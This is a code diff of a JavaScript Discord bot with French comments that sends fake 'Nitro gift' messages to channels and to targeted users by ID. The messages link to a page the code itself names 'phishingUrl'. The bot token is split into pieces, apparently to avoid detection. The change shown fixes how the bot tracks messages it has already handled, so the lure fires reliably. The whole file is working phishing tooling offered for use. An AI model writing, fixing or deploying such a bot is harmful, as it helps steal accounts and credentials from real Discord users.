@@ -5,9 +5,10 @@ const botToken = part1 + part2;
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
 const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";
 
+let processedMessages = new Set();
+
 async function listen() {
-  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
-  let lastMsgId = null;
+  console.log("Bot en ligne, en attente de commandes...");
 
   setInterval(async () => {
     try {
@@ -33,21 +34,23 @@ async function listen() {
           })).json();
           
           if (Array.isArray(msgs)) {
-            for (let m of msgs) {
-              if (!m.content || m.id === lastMsgId) continue;
+            // On parcourt les messages du plus ancien au plus récent
+            for (let i = msgs.length - 1; i >= 0; i--) {
+              let m = msgs[i];
+              if (!m.content || processedMessages.has(m.id)) continue;
               
               const content = m.content.toLowerCase().trim();
               
               // Commande "nitro" pour le salon actuel
               if (content === "nitro") {
-                lastMsgId = m.id;
+                processedMessages.add(m.id); // On enregistre l'id pour ne plus le lire
                 console.log("envoi du faux nitro dans le salon :", c.id);
                 sendNitro(c.id);
               }
               
               // Commande "dm ID" pour envoyer en privé
               if (content.startsWith("dm ")) {
-                lastMsgId = m.id;
+                processedMessages.add(m.id);
                 const targetId = content.split(" ")[1];
                 console.log("envoi du faux nitro en dm à :", targetId);
                 sendDM(targetId);
@@ -66,7 +69,7 @@ async function sendNitro(channelId) {
     description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
     color: 0x5865f2,
     image: {
-      url: imageUrl // Utilise ton image hébergée sur github
+      url: imageUrl
     }
   };
 
